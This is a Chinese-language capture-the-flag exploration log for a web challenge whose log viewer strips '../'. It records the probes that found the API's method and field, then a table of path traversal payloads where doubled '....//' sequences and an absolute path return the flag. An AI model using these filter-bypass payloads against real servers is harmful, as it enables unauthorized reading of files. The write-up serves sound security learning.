# a-01 · 探索记录

对应题解：[`a-01.md`](./a-01.md)。

## 目标与起点

题面：「CodeAudit Pro 代码审计平台，只开放日志查看，flag 在服务器某处，只有管理员能访问」。困难，500 分。

启动后 302 `/login`，登录页写着 `测试账号: auditor / 任意密码`。

## 第一阶段：登录与功能面

```bash
curl -c cj -X POST -d 'username=auditor&password=x' http://$T/login
```

登录后控制台只有 `/logs` 和 `/logout`。`/logs` 页面自述：

```
🛡️ WAF 已启用
系统已启用WAF防护，将过滤路径遍历字符（如 ../）
日志目录: /var/log/app/
```

前端接口：

```
GET  /api/logs/list
POST /api/logs/read    multipart 字段：filename
```

`/api/logs/read` 用 GET 请求返回 **405**，用 POST 但不带 `filename` 返回「文件名不能为空」——先确认了方法和字段名。

## 第二阶段：穿越测试（三次请求）

| `filename` | 结果 |
| --- | --- |
| `app.log` | 200，正常日志内容 |
| `../../../../challenge/flag.txt` | `文件不存在` |
| `....//....//....//....//challenge/flag.txt` | **flag** |
| `/challenge/flag.txt` | **flag** |
| `..%2f..%2f..%2f..%2fchallenge%2fflag.txt` | `文件不存在` |
| `....//....//....//....//challenge/flag` | `文件不存在`（少了 `.txt`） |

**结论**：过滤只删 `../`，双写即可绕过；绝对路径根本没拦；不做 URL 解码。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| GET `/api/logs/read` | 405 | 只接受 POST |
| POST 字段 `file` | 「文件名不能为空」 | 字段名是 `filename` |
| 直接 `../` 穿越 | `文件不存在` | `../` 被删 |
| URL 编码穿越 | `文件不存在` | 不做解码 |
| 无后缀 `/challenge/flag` | `文件不存在` | 真实文件名是 `flag.txt` |

## 这次真正的收获

1. **页面自述的 WAF 规则就是测试清单。** 「过滤 `../`」→ 第一反应是 `....//`。
2. **绝对路径要单独试。** 很多实现只替换相对穿越，不拦绝对路径。
3. **「文件不存在」是应用层错误，说明过滤已过。** 它和 404/400 的区别就是「路径对不对」与「请求被不被拒」。
4. **日志查看器是最常见的文件读取原语。** 题目说「只开放日志查看」时，直接把它当任意文件读来测。
5. **错误信息能省掉一轮猜测。** 字段名错误、方法错误、路径错误各有不同响应，逐个确认即可。
